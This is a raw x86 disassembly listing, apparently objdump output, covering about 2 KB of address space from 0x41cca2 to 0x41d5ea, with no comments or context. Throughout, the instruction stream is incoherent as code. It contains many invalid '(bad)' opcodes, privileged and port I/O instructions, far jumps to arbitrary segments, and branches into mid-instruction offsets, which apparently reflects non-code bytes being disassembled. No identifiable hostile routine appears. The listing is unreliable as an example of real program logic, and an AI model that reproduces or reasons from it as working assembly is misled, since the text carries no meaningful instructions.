  41cca2:	add    al,BYTE PTR [ebx-0x5a]
  41cca5:	fdivr  QWORD PTR [edx]
  41cca7:	inc    esp
  41cca8:	cmc    
  41cca9:	adc    al,0x51
  41ccab:	gs jo  0x41cca0
  41ccae:	call   0xa840c62
  41ccb3:	ret    
  41ccb4:	jmp    0x2878:0xc0fc73e7
  41ccbb:	xchg   ecx,eax
  41ccbc:	leave  
  41ccbd:	icebp  
  41ccbe:	outs   dx,BYTE PTR ds:[esi]
  41ccbf:	xor    DWORD PTR [ecx],esp
  41ccc1:	out    dx,eax
  41ccc2:	bound  edx,QWORD PTR [ebp-0x587c1257]
  41ccc8:	call   0x178b:0x320b44f8
  41cccf:	adc    DWORD PTR [eax+0xe],0x73
  41ccd3:	mov    esi,0x1fc0b839
  41ccd8:	mov    bh,0xb0
  41ccda:	push   0xb4ed3080
  41ccdf:	fistp  DWORD PTR [ebx-0x17]
  41cce2:	daa    
  41cce3:	mov    bh,0x36
  41cce5:	add    DWORD PTR [ecx-0x35],0x13278cba
  41ccec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cced:	pop    edi
  41ccee:	into   
  41ccef:	sub    eax,0x33efc866
  41ccf4:	inc    edi
  41ccf5:	fstp   st(5)
  41ccf7:	mov    ds:0xf3682078,al
  41ccfc:	sbb    DWORD PTR [edx+0x13f2c309],eax
  41cd02:	sub    edx,DWORD PTR [ebp+0x299b6527]
  41cd08:	retf   
  41cd09:	mov    al,ds:0x2885c7fa
  41cd0e:	xchg   esi,eax
  41cd0f:	das    
  41cd10:	xor    ebp,ebx
  41cd12:	sahf   
  41cd13:	xlat   BYTE PTR ds:[ebx]
  41cd14:	bnd jg 0x41cd4f
  41cd17:	or     DWORD PTR [ecx],ecx
  41cd19:	dec    edx
  41cd1a:	and    BYTE PTR [ecx-0x30],al
  41cd1d:	push   eax
  41cd1e:	call   DWORD PTR [ebx]
  41cd20:	rcl    DWORD PTR [eax+ebx*2-0x205a97e],1
  41cd27:	aad    0x68
  41cd29:	out    0x68,eax
  41cd2b:	adc    al,0x3e
  41cd2d:	mov    BYTE PTR [ecx-0x19],ah
  41cd30:	mov    ds:0xb7266b4b,al
  41cd35:	push   ecx
  41cd36:	cmp    eax,0x847df992
  41cd3b:	push   ebx
  41cd3c:	jl     0x41ccc2
  41cd3e:	dec    edx
  41cd3f:	jl     0x41cdc0
  41cd41:	scas   eax,DWORD PTR es:[edi]
  41cd42:	mov    ebp,0xe112cef
  41cd47:	hlt    
  41cd48:	jecxz  0x41cd10
  41cd4a:	in     al,dx
  41cd4b:	cmp    dh,BYTE PTR [ebx+ebx*1-0x5463d8ec]
  41cd52:	clc    
  41cd53:	int3   
  41cd54:	ins    DWORD PTR es:[edi],dx
  41cd55:	(bad)  
  41cd57:	jmp    0x9027f32f
  41cd5c:	(bad)  
  41cd5d:	jmp    0x41cd7f
  41cd5f:	sbb    eax,0x5036be61
  41cd64:	mov    al,dh
  41cd66:	cmp    ecx,ecx
  41cd68:	sti    
  41cd69:	push   esi
  41cd6a:	enter  0x3269,0x53
  41cd6e:	cmc    
  41cd6f:	push   esi
  41cd70:	jbe    0x41cd93
  41cd72:	ins    DWORD PTR es:[di],dx
  41cd74:	jae    0x41cde6
  41cd76:	mov    ds:0xae18597e,al
  41cd7b:	scas   al,BYTE PTR es:[edi]
  41cd7c:	call   FWORD PTR [eax-0x38]
  41cd7f:	mov    ds:0x4132d43f,eax
  41cd84:	xor    edi,ecx
  41cd86:	sub    al,BYTE PTR [eax+0x67]
  41cd89:	scas   eax,DWORD PTR es:[edi]
  41cd8a:	inc    esi
  41cd8b:	push   ebp
  41cd8c:	pusha  
  41cd8d:	cmp    ebx,DWORD PTR [ebx]
  41cd8f:	mov    ebp,0xca5238e8
  41cd94:	test   DWORD PTR [ebx-0x4d],esi
  41cd97:	pop    esp
  41cd98:	hlt    
  41cd99:	xor    DWORD PTR [esi+0x30c2b42d],eax
  41cd9f:	pop    edi
  41cda0:	mov    dl,0xe7
  41cda2:	ja     0x41cd36
  41cda4:	jecxz  0x41cd82
  41cda6:	pop    esi
  41cda7:	fbld   TBYTE PTR [ebx+0x5db878b4]
  41cdad:	and    al,0x89
  41cdaf:	sub    ebx,DWORD PTR [edx]
  41cdb1:	sti    
  41cdb2:	lds    eax,FWORD PTR [ecx+eiz*2]
  41cdb5:	(bad)
  41cdb9:	mov    cl,0x86
  41cdbb:	es sub al,0x1a
  41cdbe:	popf   
  41cdbf:	dec    edx
  41cdc0:	or     BYTE PTR [ecx],ah
  41cdc2:	push   edi
  41cdc3:	ds and eax,0x4c5ca805
  41cdc9:	cli    
  41cdca:	or     dh,dl
  41cdcc:	jns    0x41cdaa
  41cdce:	mov    al,ds:0x9e53ae4
  41cdd3:	jle    0x41cd6f
  41cdd5:	(bad)  
  41cdd6:	shr    DWORD PTR [eax+0x2],0xdb
  41cdda:	fld    TBYTE PTR [edi+0x1432967]
  41cde0:	stc    
  41cde1:	xchg   ecx,eax
  41cde2:	(bad)  
  41cde3:	fidiv  WORD PTR [edx*1+0x30195454]
  41cdea:	fnsave [edi*2-0x43b1dc86]
  41cdf1:	ss out 0x8f,al
  41cdf4:	and    DWORD PTR [edi+0x77],0x5a
  41cdf8:	stos   BYTE PTR es:[edi],al
  41cdf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdfa:	mov    bl,0xc1
  41cdfc:	or     al,0x9a
  41cdfe:	xor    BYTE PTR [ecx+edi*1+0x14b4f4f3],dh
  41ce05:	(bad)  
  41ce06:	dec    edx
  41ce07:	add    DWORD PTR [edi-0x72],eax
  41ce0a:	fsubr  DWORD PTR [edi-0x7c30e0cf]
  41ce10:	mov    dh,0x97
  41ce12:	mov    ch,0xf5
  41ce14:	sub    al,0xa0
  41ce16:	lea    ebp,[eax]
  41ce18:	in     al,dx
  41ce19:	pop    esi
  41ce1a:	pop    ebx
  41ce1b:	sbb    ebx,DWORD PTR [ecx-0x428aeffc]
  41ce21:	shr    ebp,0xca
  41ce24:	mov    esp,0xe5893181
  41ce29:	arpl   WORD PTR [ebx+0x0],si
  41ce2c:	stc    
  41ce2d:	push   esp
  41ce2e:	xor    bl,BYTE PTR [edx]
  41ce30:	aaa    
  41ce31:	ss int3 
  41ce33:	rcl    DWORD PTR [eax+0x13],1
  41ce36:	mov    cl,0xd
  41ce38:	stc    
  41ce39:	dec    ebp
  41ce3a:	call   0xa1b23078
  41ce3f:	mov    al,ds:0xabf2da1e
  41ce44:	mov    DWORD PTR [ecx+edx*1+0x44f909bf],0x2af2a760
  41ce4f:	mov    al,0x0
  41ce51:	add    ecx,DWORD PTR [edi+ebp*1-0x42]
  41ce55:	mov    edi,0x93c09331
  41ce5a:	inc    ebp
  41ce5b:	push   ecx
  41ce5c:	fbld   TBYTE PTR ds:0x53f1e0c1
  41ce62:	daa    
  41ce63:	push   es
  41ce64:	test   al,0xdf
  41ce66:	sub    BYTE PTR [esi+eax*1+0x2f84754a],dh
  41ce6d:	aaa    
  41ce6e:	bound  esp,QWORD PTR [edx]
  41ce70:	in     eax,0x7d
  41ce72:	invd   
  41ce74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce75:	mov    esp,0x712e5e6
  41ce7a:	dec    esi
  41ce7b:	out    dx,al
  41ce7c:	(bad)  
  41ce7e:	ja     0x41ce21
  41ce80:	into   
  41ce81:	mov    cs,WORD PTR [eax+0x5c36f80b]
  41ce87:	adc    BYTE PTR [edi+ebp*8+0x66],0x65
  41ce8c:	jecxz  0x41ce41
  41ce8e:	(bad)  
  41ce8f:	(bad)  
  41ce90:	xchg   esp,eax
  41ce91:	call   0x9386a5ef
  41ce96:	pop    es
  41ce97:	sub    al,0xd6
  41ce99:	lds    edi,FWORD PTR [ecx-0x59]
  41ce9c:	fstp   QWORD PTR [edx]
  41ce9e:	xchg   BYTE PTR [ecx+0x1658d0c0],dh
  41cea4:	push   edi
  41cea5:	jns    0x41ce97
  41cea7:	mov    cs,WORD PTR [eax+0x51]
  41ceaa:	mov    esi,0xfefbcc60
  41ceaf:	adc    al,0x2c
  41ceb1:	(bad)
  41ceb4:	jnp    0x41ced0
  41ceb6:	js     0x41cea8
  41ceb8:	scas   eax,DWORD PTR es:[edi]
  41ceb9:	test   DWORD PTR [edi+ecx*1-0x5d],0x1f993453
  41cec1:	mov    dh,0xd7
  41cec3:	adc    DWORD PTR [eax+0x78d49a59],esi
  41cec9:	or     edx,edx
  41cecb:	out    dx,eax
  41cecc:	cmp    BYTE PTR [esi+0x609f0618],dh
  41ced2:	xor    ecx,edi
  41ced4:	push   edx
  41ced5:	mov    bh,0x4e
  41ced7:	pop    ecx
  41ced8:	fimul  DWORD PTR [ebx-0x62]
  41cedb:	popa   
  41cedc:	mov    al,0x36
  41cede:	and    al,0xe4
  41cee0:	and    BYTE PTR [edx-0x3b],ch
  41cee3:	jecxz  0x41cf22
  41cee5:	mov    al,ds:0x1bd77474
  41ceea:	jb     0x41cf5e
  41ceec:	les    esi,FWORD PTR [esi*4+0x7e7aa8b0]
  41cef3:	mov    dh,0xa1
  41cef5:	pop    es
  41cef6:	ja     0x41cf53
  41cef8:	neg    BYTE PTR [ecx-0x15]
  41cefb:	and    cl,al
  41cefd:	sub    bh,dl
  41ceff:	out    dx,eax
  41cf00:	mov    ebp,0xcc4ca278
  41cf05:	inc    esp
  41cf06:	xchg   edx,eax
  41cf07:	inc    edx
  41cf08:	fxch   st(1)
  41cf0a:	xchg   ebx,eax
  41cf0b:	(bad)  
  41cf0c:	sub    BYTE PTR [ecx],bl
  41cf0e:	and    eax,0x5b35cfa7
  41cf13:	pop    ebp
  41cf14:	pop    esp
  41cf15:	aas    
  41cf16:	es in  al,0xa3
  41cf19:	xchg   DWORD PTR [edx],eax
  41cf1b:	pop    eax
  41cf1c:	jb     0x41cf2c
  41cf1e:	or     al,0xcf
  41cf20:	ins    BYTE PTR es:[edi],dx
  41cf21:	cwde   
  41cf22:	repz push ss
  41cf24:	mov    ebx,0x31e75b45
  41cf29:	mov    ebp,DWORD PTR [ecx-0x31d44ed2]
  41cf2f:	jae    0x41ced6
  41cf31:	lahf   
  41cf32:	mov    dh,0x84
  41cf34:	lock jle 0x41cf2b
  41cf37:	rcr    BYTE PTR [ebp+0x6d],1
  41cf3a:	mov    ds:0x167445e5,al
  41cf3f:	cmp    ebx,DWORD PTR [ecx+0x29]
  41cf42:	dec    esp
  41cf43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf44:	mov    dl,0x22
  41cf46:	fwait
  41cf47:	dec    esi
  41cf48:	lock mov ebp,ebx
  41cf4b:	xchg   esi,eax
  41cf4c:	test   DWORD PTR [edi],ebp
  41cf4e:	mov    ah,BYTE PTR [edi-0x2cc8988c]
  41cf54:	xor    al,0xb0
  41cf56:	aam    0x23
  41cf58:	xchg   ecx,eax
  41cf59:	jno    0x41cfd5
  41cf5b:	add    eax,0x1475a72
  41cf60:	(bad)  
  41cf61:	ds or  eax,0x1c676d29
  41cf67:	mov    al,ds:0x102975a7
  41cf6c:	ins    BYTE PTR es:[edi],dx
  41cf6d:	mov    esp,0xcbd39d7
  41cf72:	in     al,0xe3
  41cf74:	scas   al,BYTE PTR es:[edi]
  41cf75:	and    BYTE PTR [ecx+0x1b],dh
  41cf78:	aas    
  41cf79:	pop    edi
  41cf7a:	in     eax,dx
  41cf7b:	or     eax,0xefa9bffa
  41cf80:	mov    BYTE PTR [bp-0x602d],al
  41cf85:	ror    BYTE PTR [esi+0x3d],cl
  41cf88:	sbb    DWORD PTR [edi+ecx*2+0x20],ebp
  41cf8c:	mov    WORD PTR [edi-0x2f3bdcb7],es
  41cf92:	fwait
  41cf93:	repnz xor eax,0xb1585c30
  41cf99:	jl     0x41cf59
  41cf9b:	push   cs
  41cf9c:	and    edi,edi
  41cf9e:	and    ch,dh
  41cfa0:	dec    esp
  41cfa1:	cmp    DWORD PTR [ecx+0x49ef8a07],esi
  41cfa7:	aad    0x87
  41cfa9:	nop    DWORD PTR [ecx]
  41cfac:	mov    cl,0xc7
  41cfae:	fst    QWORD PTR ds:0x12ae2569
  41cfb4:	call   0xd3a4:0x76f12108
  41cfbb:	ret    0xe6f3
  41cfbe:	xchg   esi,eax
  41cfbf:	add    al,0x36
  41cfc1:	outs   dx,BYTE PTR ds:[esi]
  41cfc2:	ror    ecx,0xc6
  41cfc5:	push   ds
  41cfc6:	and    dh,BYTE PTR [ecx-0x157892ca]
  41cfcc:	adc    ebp,eax
  41cfce:	or     edx,DWORD PTR [ebx-0x57]
  41cfd1:	sar    BYTE PTR [ebx+eiz*2-0x79],1
  41cfd5:	stc    
  41cfd6:	pop    edx
  41cfd7:	ret    0xdcda
  41cfda:	jns    0x41cfd5
  41cfdc:	in     eax,dx
  41cfdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfde:	push   esi
  41cfdf:	or     bh,BYTE PTR [eax]
  41cfe1:	arpl   WORD PTR ds:0x66df8147,bp
  41cfe7:	inc    edi
  41cfe8:	loop   0x41cf7c
  41cfea:	popa   
  41cfeb:	shl    ch,cl
  41cfed:	add    ah,BYTE PTR [ecx-0x6a]
  41cff0:	rcl    BYTE PTR [esi+ebx*8+0x53],1
  41cff4:	dec    edi
  41cff5:	sub    ebp,edi
  41cff7:	ret    
  41cff8:	sar    edx,cl
  41cffa:	(bad)  
  41cffb:	in     eax,dx
  41cffc:	into   
  41cffd:	push   esi
  41cffe:	test   dl,dl
  41d000:	sbb    al,0xf7
  41d002:	pop    ebp
  41d003:	xor    eax,0xf3e3e1f
  41d008:	mov    esi,0x1cbb4e00
  41d00d:	test   eax,ebp
  41d00f:	sub    ah,0xc6
  41d012:	cs cwde 
  41d014:	xor    dl,cl
  41d016:	or     eax,esi
  41d018:	aas    
  41d019:	mov    eax,0x6b6d6523
  41d01e:	cmp    ecx,DWORD PTR [eax+0x2c1860f5]
  41d024:	mov    cl,BYTE PTR [edi+0x57]
  41d027:	aas    
  41d028:	sub    dh,BYTE PTR [ecx]
  41d02a:	or     ebp,0x23b478ff
  41d030:	mov    edx,0x2c449786
  41d035:	mov    ds:0xa1c5022,al
  41d03a:	or     DWORD PTR [ebx-0x62],ebx
  41d03d:	add    al,ah
  41d03f:	loop   0x41d029
  41d041:	int3   
  41d042:	imul   ebp,DWORD PTR cs:[ecx],0x66
	...
  41d21d:	add    BYTE PTR [ecx-0x2],al
  41d220:	test   BYTE PTR [ebx],ah
  41d222:	mov    edi,0x51fee77b
  41d227:	jecxz  0x41d24e
  41d229:	arpl   si,ax
  41d22b:	add    dl,BYTE PTR [eax+edx*2+0x1858f]
  41d232:	and    al,BYTE PTR [edi]
  41d234:	add    BYTE PTR [eax],al
  41d236:	sub    ebx,DWORD PTR [ecx]
  41d238:	sar    esp,cl
  41d23a:	and    ch,BYTE PTR [ecx-0x4a]
  41d23d:	xor    al,0x8d
  41d23f:	push   eax
  41d240:	or     eax,0x82351abf
  41d245:	sub    al,0x2d
  41d247:	lahf   
  41d248:	xchg   esi,eax
  41d249:	dec    esi
  41d24a:	pop    edi
  41d24b:	scas   al,BYTE PTR es:[edi]
  41d24c:	loop   0x41d29c
  41d24e:	xchg   edx,ebx
  41d250:	mov    edi,0xee8ccd28
  41d255:	cmp    eax,0x9e4236e7
  41d25a:	push   esi
  41d25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d25c:	jno    0x41d1f8
  41d25e:	scas   eax,DWORD PTR es:[edi]
  41d25f:	outs   dx,BYTE PTR ds:[esi]
  41d260:	push   0x11
  41d262:	data16 div BYTE PTR [eax]
  41d265:	mov    bl,0x19
  41d267:	fs cmc 
  41d269:	sub    BYTE PTR [ecx],ch
  41d26b:	xchg   ebp,eax
  41d26c:	sub    al,0xb7
  41d26e:	adc    DWORD PTR [edx],esp
  41d270:	lods   al,BYTE PTR ds:[esi]
  41d271:	xor    bh,BYTE PTR [ecx-0x2bc4da9d]
  41d277:	push   cs
  41d278:	xchg   ebp,eax
  41d279:	jmp    0x41d22e
  41d27b:	imul   eax,ebp,0xffffff88
  41d27e:	sti    
  41d27f:	mov    esi,0x6d529830
  41d284:	js     0x41d2a6
  41d286:	jg     0x41d24d
  41d288:	in     al,dx
  41d289:	repnz (bad) 
  41d28b:	mov    esp,0x940f43d8
  41d290:	fdivr  st,st(4)
  41d292:	cmp    ebp,eax
  41d294:	sub    DWORD PTR [ebp+0x1111770c],edx
  41d29a:	pop    edi
  41d29b:	and    al,0xa8
  41d29d:	jnp    0x41d266
  41d29f:	adc    al,BYTE PTR [edx]
  41d2a1:	jmp    0x7cc78deb
  41d2a6:	mov    edi,0xa88a40fe
  41d2ab:	leave  
  41d2ac:	call   0xd130:0xeb1f4369
  41d2b3:	dec    esi
  41d2b4:	retf   
  41d2b5:	cli    
  41d2b6:	in     eax,dx
  41d2b7:	stos   BYTE PTR es:[edi],al
  41d2b8:	xchg   ebx,eax
  41d2b9:	es add eax,0xd61f4b1
  41d2bf:	jns    0x41d28d
  41d2c1:	and    bl,BYTE PTR [eax]
  41d2c3:	jge    0x41d33f
  41d2c5:	call   0x8277:0xef747ade
  41d2cc:	cmp    dh,bh
  41d2ce:	pusha  
  41d2cf:	call   0xfc9ece
  41d2d4:	add    eax,0xeb1d96fd
  41d2d9:	fsubr  DWORD PTR [ecx+0x5f5283fe]
  41d2df:	or     DWORD PTR [ebx-0x27],edi
  41d2e2:	mov    ebp,0xda78ff26
  41d2e7:	mov    bh,0x8
  41d2e9:	cmp    edi,DWORD PTR [esi-0x6945b912]
  41d2ef:	or     al,0x7e
  41d2f1:	cmp    DWORD PTR [esi-0x49],edi
  41d2f4:	xor    BYTE PTR [ebx],cl
  41d2f6:	mov    esp,0x56245363
  41d2fb:	test   DWORD PTR [ecx],edx
  41d2fd:	lahf   
  41d2fe:	mov    cs,WORD PTR ds:0x6deb3e06
  41d304:	out    0x6c,al
  41d306:	pop    ecx
  41d307:	pop    ecx
  41d308:	popf   
  41d309:	(bad)  
  41d30a:	out    dx,eax
  41d30b:	cmp    eax,0x68a6e0b5
  41d310:	sbb    ah,ch
  41d312:	jae    0x41d379
  41d314:	outs   dx,BYTE PTR ds:[esi]
  41d315:	data16 fwait
  41d317:	adc    ah,ah
  41d319:	(bad)  
  41d31a:	mov    dl,0xdc
  41d31c:	cmp    eax,0x35677917
  41d321:	fild   WORD PTR [ecx-0x224d176a]
  41d327:	or     DWORD PTR [ecx],edx
  41d329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d32a:	in     eax,0x4
  41d32c:	push   eax
  41d32d:	and    DWORD PTR [edi+0x25ef6b92],esp
  41d333:	mov    al,0x47
  41d335:	dec    ebx
  41d336:	scas   al,BYTE PTR es:[edi]
  41d337:	dec    edx
  41d338:	and    al,0x24
  41d33a:	add    al,0xd1
  41d33c:	out    dx,eax
  41d33d:	mov    eax,ds:0x6c2a1431
  41d342:	clc    
  41d343:	and    DWORD PTR [ecx],esi
  41d345:	xchg   esp,eax
  41d346:	jb     0x41d3c3
  41d348:	dec    esp
  41d349:	cmp    esi,edi
  41d34b:	popf   
  41d34c:	push   es
  41d34d:	push   esi
  41d34e:	cmp    DWORD PTR [eax+0x16e4ce52],ebx
  41d354:	pop    ebp
  41d355:	loope  0x41d31c
  41d357:	inc    esi
  41d358:	pop    esp
  41d359:	push   ebp
  41d35a:	sub    DWORD PTR [ecx-0x71],0xfffffff1
  41d35e:	in     al,0xb5
  41d360:	mov    ebx,0xdc6d6bcc
  41d365:	dec    si
  41d367:	pop    esi
  41d368:	out    0x5c,eax
  41d36a:	mov    edi,0x5ed34117
  41d36f:	fmul   DWORD PTR [eax+0x2957b725]
  41d375:	mov    edx,0xd18e88f9
  41d37a:	mov    ah,0x4c
  41d37c:	jbe    0x41d31e
  41d37e:	es push ebx
  41d380:	mov    WORD PTR [edx],cs
  41d382:	loop   0x41d3ce
  41d384:	mov    BYTE PTR [ebp+0x4],bl
  41d387:	shl    BYTE PTR [esi+0x31ff893a],cl
  41d38d:	dec    esp
  41d38e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d38f:	fsubp  st(3),st
  41d391:	mov    al,ds:0xbe4b2356
  41d396:	fs jne 0x41d3c1
  41d399:	in     al,dx
  41d39a:	jmp    0x41d3aa
  41d39c:	mov    al,0x46
  41d39e:	inc    ebx
  41d39f:	fsubr  st,st(4)
  41d3a1:	push   0xc274432
  41d3a6:	jl     0x41d3a7
  41d3a8:	mov    dl,0x1f
  41d3aa:	and    DWORD PTR [esi+0x2a],eax
  41d3ad:	push   eax
  41d3ae:	(bad)  
  41d3af:	cmp    al,0xe4
  41d3b1:	cmp    BYTE PTR [ecx],dl
  41d3b3:	inc    eax
  41d3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3b5:	and    ebp,ecx
  41d3b7:	pop    ebx
  41d3b8:	(bad)  
  41d3ba:	dec    edx
  41d3bb:	and    eax,0x58316b24
  41d3c0:	jo     0x41d426
  41d3c2:	bound  edx,QWORD PTR [edi+0x71]
  41d3c5:	xchg   ecx,eax
  41d3c6:	retf   0x36cc
  41d3c9:	(bad)  
  41d3ca:	retf   
  41d3cb:	(bad)  
  41d3cc:	push   ecx
  41d3cd:	dec    ebp
  41d3ce:	mov    ch,0xd7
  41d3d0:	dec    ecx
  41d3d1:	mov    ebp,0xab48038c
  41d3d6:	push   es
  41d3d7:	mov    ebp,0x69a40eb7
  41d3dc:	mov    esp,eax
  41d3de:	jmp    0x57b4:0x4972fda5
  41d3e5:	inc    edx
  41d3e6:	(bad)  
  41d3e7:	push   ebx
  41d3e8:	or     DWORD PTR [ebp-0x3b23feb],ecx
  41d3ee:	fild   DWORD PTR [eax+0x1099e824]
  41d3f4:	bound  edi,QWORD PTR [edx+0x2f]
  41d3f7:	(bad)
  41d3fc:	(bad)  
  41d3fd:	fisttp WORD PTR [ecx]
  41d3ff:	(bad)  
  41d400:	ds inc esi
  41d402:	sub    eax,0x48d3e400
  41d407:	sahf   
  41d408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d409:	jmp    0x103a:0xbccd9367
  41d410:	cld    
  41d411:	xchg   edx,eax
  41d412:	sub    dl,BYTE PTR [edi+0x34]
  41d415:	(bad)  
  41d416:	jl     0x41d3d0
  41d418:	data16 adc ch,BYTE PTR [ebp+0xdf4c5a3]
  41d41f:	test   DWORD PTR [edi-0x49ce75bb],esi
  41d425:	nop
  41d426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d427:	add    ebp,DWORD PTR [ebx]
  41d429:	into   
  41d42a:	and    DWORD PTR [ecx+ebp*1],ecx
  41d42d:	in     eax,dx
  41d42e:	xchg   esp,eax
  41d42f:	enter  0xb68b,0x40
  41d433:	push   ss
  41d434:	pop    ecx
  41d435:	jne    0x41d457
  41d437:	pop    ecx
  41d438:	mov    dl,0xb9
  41d43a:	cs loop 0x41d3c7
  41d43d:	je     0x41d3d7
  41d43f:	xor    dl,BYTE PTR [eax-0x40]
  41d442:	and    ah,BYTE PTR [esi+0x37]
  41d445:	lahf   
  41d446:	mov    al,0x52
  41d448:	(bad)  
  41d44a:	add    eax,0xbeeb0296
  41d44f:	sahf   
  41d450:	add    BYTE PTR [esi],bh
  41d452:	daa    
  41d453:	jg     0x41d456
  41d455:	mov    edx,0xb742cb0b
  41d45a:	in     eax,dx
  41d45b:	aad    0x56
  41d45d:	mov    edx,0x2f9f9c5a
  41d462:	inc    esi
  41d463:	int3   
  41d464:	stos   BYTE PTR es:[edi],al
  41d465:	add    al,0x38
  41d467:	xchg   edi,eax
  41d468:	mov    esi,0x37abd22e
  41d46d:	xchg   ecx,edi
  41d46f:	xchg   edi,eax
  41d470:	push   cs
  41d471:	xchg   ebp,eax
  41d472:	shl    DWORD PTR [eax+esi*1+0xe],1
  41d476:	mov    esp,0xc3f4c9e2
  41d47b:	pop    edx
  41d47c:	push   eax
  41d47d:	fidiv  DWORD PTR [esi+0x56]
  41d480:	sub    eax,DWORD PTR [eax+0x68]
  41d483:	or     al,0xb
  41d485:	repnz xor dl,BYTE PTR [edx+0x3dcf1a76]
  41d48c:	add    dl,BYTE PTR [esp+ecx*2-0x54]
  41d490:	sbb    al,0xc3
  41d492:	rcr    DWORD PTR [edx-0x41],0xea
  41d496:	sub    ebp,DWORD PTR [edx-0x36]
  41d499:	mov    eax,ds:0x904c9f36
  41d49e:	ret    
  41d49f:	sti    
  41d4a0:	push   0xffffffb9
  41d4a2:	mov    cl,0xd1
  41d4a4:	ins    BYTE PTR es:[edi],dx
  41d4a5:	cli    
  41d4a6:	adc    al,0x5
  41d4a8:	xchg   BYTE PTR [esi-0x159e2c9a],dl
  41d4ae:	adc    DWORD PTR [eax-0x673cdc8a],esp
  41d4b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4b5:	add    dl,0x87
  41d4b8:	cwde   
  41d4b9:	pop    esp
  41d4ba:	inc    ebp
  41d4bb:	or     DWORD PTR [ebp-0x4b03ad13],ebx
  41d4c1:	out    dx,eax
  41d4c2:	sti    
  41d4c3:	jbe    0x41d4fa
  41d4c5:	push   esi
  41d4c6:	lea    esp,[edi]
  41d4c8:	out    0x64,al
  41d4ca:	call   0x7c09:0xd1693a7f
  41d4d1:	xchg   edi,eax
  41d4d2:	lahf   
  41d4d3:	dec    edi
  41d4d4:	cmp    eax,0xbdc423c2
  41d4d9:	loopne 0x41d478
  41d4db:	pop    edx
  41d4dc:	push   edx
  41d4dd:	enter  0x51d5,0x29
  41d4e1:	pop    edi
  41d4e2:	mov    dl,0xff
  41d4e4:	shr    al,cl
  41d4e6:	sub    cl,BYTE PTR [edx]
  41d4e8:	xchg   ebp,eax
  41d4e9:	mov    ds:0x7fb7a6da,al
  41d4ee:	mov    eax,esi
  41d4f0:	mov    ds:0x60d57fc4,eax
  41d4f5:	jbe    0x41d537
  41d4f7:	(bad)  
  41d4f9:	add    eax,0x36897dfe
  41d4fe:	fcomp  QWORD PTR [edx+0x57e0440c]
  41d505:	pushf  
  41d506:	aaa    
  41d507:	leave  
  41d508:	push   esi
  41d509:	lods   eax,DWORD PTR ds:[esi]
  41d50a:	fmulp  st(5),st
  41d50c:	lock add edi,DWORD PTR [edx+0x64ae391e]
  41d513:	add    DWORD PTR [ebx+0x1bec7b45],esi
  41d519:	cmp    eax,DWORD PTR ss:[edi+edx*2+0x7d4f9d]
  41d521:	xor    BYTE PTR [esp+ecx*2],al
  41d524:	jbe    0x41d4c5
  41d526:	popf   
  41d527:	(bad)  
  41d529:	jmp    0x4f316e91
  41d52e:	jne    0x41d561
  41d530:	mov    al,0x44
  41d532:	ins    BYTE PTR es:[edi],dx
  41d533:	inc    eax
  41d534:	(bad)  
  41d535:	pop    ebx
  41d536:	dec    edx
  41d537:	dec    esi
  41d538:	ja     0x41d57c
  41d53a:	je     0x41d58c
  41d53c:	fadd   st,st(2)
  41d53e:	test   eax,0xf13784f
  41d543:	jne    0x41d5a1
  41d545:	rcl    BYTE PTR [ebx+0x4b23dfc6],0x6d
  41d54c:	pop    esi
  41d54d:	fldcw  WORD PTR [edx-0x277d2c4]
  41d553:	lahf   
  41d554:	sub    bh,BYTE PTR [ebp+0xb]
  41d557:	in     al,dx
  41d558:	lahf   
  41d559:	stos   BYTE PTR es:[edi],al
  41d55a:	inc    edx
  41d55b:	sbb    BYTE PTR [esi+0x463c51fc],al
  41d561:	ins    BYTE PTR es:[edi],dx
  41d562:	jle    0x41d581
  41d564:	je     0x41d50d
  41d566:	mov    edi,0x71b3e9c9
  41d56b:	lock and al,bl
  41d56e:	xchg   DWORD PTR [edi],eax
  41d570:	ss mov esi,0xc7f8c371
  41d576:	push   cs
  41d577:	add    bh,0xd1
  41d57a:	push   ebx
  41d57c:	fwait
  41d57d:	cdq    
  41d57e:	push   cs
  41d57f:	in     eax,dx
  41d580:	xchg   ebx,eax
  41d581:	pop    ecx
  41d582:	mov    bl,0xf2
  41d584:	inc    ebp
  41d585:	sahf   
  41d586:	mov    bl,0xb8
  41d588:	mov    cl,0x6f
  41d58a:	sahf   
  41d58b:	lds    ebx,FWORD PTR [esi]
  41d58d:	call   0x4a58:0x36543e8
  41d594:	xchg   ebx,eax
  41d595:	lea    ecx,[eax-0xea95235]
  41d59b:	fs xchg esi,eax
  41d59d:	(bad)  
  41d59e:	sub    eax,0xad981cdc
  41d5a3:	js     0x41d55b
  41d5a5:	fst    st(0)
  41d5a7:	dec    edx
  41d5a8:	add    dh,bh
  41d5aa:	mov    bl,0x5b
  41d5ac:	pop    ss
  41d5ad:	scas   al,BYTE PTR es:[edi]
  41d5ae:	fsubr  DWORD PTR [edi]
  41d5b0:	fs xchg edx,eax
  41d5b2:	shl    BYTE PTR [edx+0x3667a387],0x8f
  41d5b9:	popa   
  41d5ba:	ja     0x41d5b5
  41d5bc:	cdq    
  41d5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5be:	imul   edi,DWORD PTR [edi],0x69
  41d5c1:	jne    0x41d55c
  41d5c3:	or     DWORD PTR [eax+ebx*1-0x16cf9653],esi
  41d5ca:	mov    bl,0xe8
  41d5cc:	xor    DWORD PTR [ecx-0x7],0x57
  41d5d0:	daa    
  41d5d1:	jbe    0x41d5ea
  41d5d3:	das    
  41d5d4:	mov    esi,0x1d4dd5c3
  41d5d9:	imul   WORD PTR [ecx-0x76]
  41d5dd:	out    dx,al
  41d5de:	xchg   edx,eax
  41d5df:	in     al,dx
  41d5e0:	std    
  41d5e1:	jg     0x41d5cd
  41d5e3:	or     eax,0xf297f802
  41d5e8:	js     0x41d5dc
  41d5ea:	bound  ecx,QWORD PTR [eax]
